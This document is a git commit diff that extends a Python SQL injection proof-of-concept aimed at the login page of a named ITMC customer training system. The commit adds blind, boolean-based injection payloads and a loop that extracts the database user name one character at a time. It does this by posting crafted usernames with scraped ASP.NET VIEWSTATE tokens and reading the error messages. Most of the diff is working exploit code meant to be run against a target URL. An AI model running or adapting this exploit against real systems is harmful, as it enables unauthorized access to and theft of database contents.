6dbdc47186ec57f763e402923b1fc673c892d826
S1RH <120012411+S1RH@users.noreply.github.com>
2022-12-15 15:53:38 +0800

    Update itmc-SQLi-POC.py

--- itmc-SQLi-POC.py
+++ itmc-SQLi-POC.py
@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-from ast import pattern
+#from ast import pattern
 import re
 import time
 from tracemalloc import start
@@ -18,6 +18,11 @@ import urllib.parse
 payload_test1 = "admin\' and 1=1--"
 payload_test2 = "admin\' and 1=2--"
 
+payload_user = "admin\' and ascii(substring((user_name()),1,1))=100--"
+payload_databases = "admin\'"+""+""
+payload_tables = ""
+payload_users = ""
+
 def get_VIEWSTATE(r):
     pattern1 = r'VIEWSTATE\".*value=\".*\"'
     match=re.search(pattern1,r).group(0)
@@ -31,6 +36,34 @@ def get_EVENTVALIDATION(r):
     pattern2=r'EVENTVALIDATION\" id=\"__EVENTVALIDATION\" value=\"'
     match1=re.split(pattern2,match);
     return match1[1][:-1]; #返回_EVENTVALIDATION
+
+def get_allDatabases(target):
+    s = requests.session()
+    result = ''
+
+    for i in range(1,100):
+        #print(i)
+        for j in range(32, 123):
+
+                res = s.get(url=target)
+                payload = "\' and ascii(substring((user_name()),%d,1))=%d--" % (i,j)  
+                data = {'username':payload,'password':'admin','__VIEWSTATE':get_VIEWSTATE(res.text), '__EVENTVALIDATION':get_EVENTVALIDATION(res.text), 'kuakaoLoginBtn':''}
+                res = s.post(url=target, data=data, headers=headers)
+                
+                if "密码不正确" in res.text:
+                    result += chr(j)
+                    #print(result)
+                    break
+                else:
+                    pass
+
+
+        if result != '' and result == 'dbo':
+            #print("SQL漏洞存在")
+            print("结果为: "+result)
+            break
+
+
 
 def poc(target):
     s = requests.session()
@@ -52,6 +85,7 @@ def poc(target):
     if "密码不正确" in res_true.text:
         if "帐号不存在" in res_false.text:
             print("SQL注入漏洞存在")
+            # 输出一个数据证明
         else:
             print("SQL注入漏洞不存在")
     else:
@@ -61,3 +95,5 @@ def poc(target):
 if __name__ == '__main__':
     target = str(input('请输入ITMC网点客户实训系统登陆页面的URL: '))
     poc(target)
+    print("开始爆破数据\n")
+    get_allDatabases(target)
